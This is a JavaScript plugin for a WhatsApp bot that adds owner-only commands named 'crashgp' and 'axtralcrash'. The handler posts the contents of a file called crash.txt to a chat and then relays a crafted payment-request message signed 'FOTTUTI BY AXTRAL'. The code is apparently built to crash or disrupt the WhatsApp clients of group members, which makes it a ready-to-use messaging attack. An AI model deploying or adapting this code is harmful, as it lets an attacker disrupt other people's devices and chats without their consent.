// fatto da kinder
import fs from 'fs'
import path from 'path'

let handler = async (m, { conn }) => {
  const jid = m.chat
  const filePath = path.resolve('./storage/crash.txt')

  if (!fs.existsSync(filePath)) {
    return m.reply(`❌ *File non trovato!*\n🔎 Assicurati che axtral.txt esista nella cartella ./storage`)
  }

  const content = fs.readFileSync(filePath, 'utf-8')
  if (!content.trim()) {
    return m.reply('⚠️ *Il file axtral.txt è vuoto!*')
  }

  await conn.sendMessage(jid, { text: content }, { quoted: m })

  await conn.relayMessage(
    jid,
    {
      requestPaymentMessage: {
        noteMessage: {
          extendedTextMessage: {
            text: '𝐅𝐎𝐓𝐓𝐔𝐓𝐈 𝐁𝐘 𝛬𝑿𝑻𝑹𝜜𝑳',
            contextInfo: {
              externalAdReply: {
                title: 'Axtral_WiZaRd',
                body: 'Unisciti ora!',
                mediaType: 1,
                renderLargerThumbnail: true,
                showAdAttribution: false,
              },
            },
          },
          currencyCodeIso4217: 'USD',
          requestFrom: '0@s.whatsapp.net',
          amount: 99,
          expiryTimestamp: Date.now() + 99999,
        },
      },
    },
    {}
  )
}

handler.command = ['crashgp', 'hehehe', 'axtralcrash']
handler.owner = true

export default handler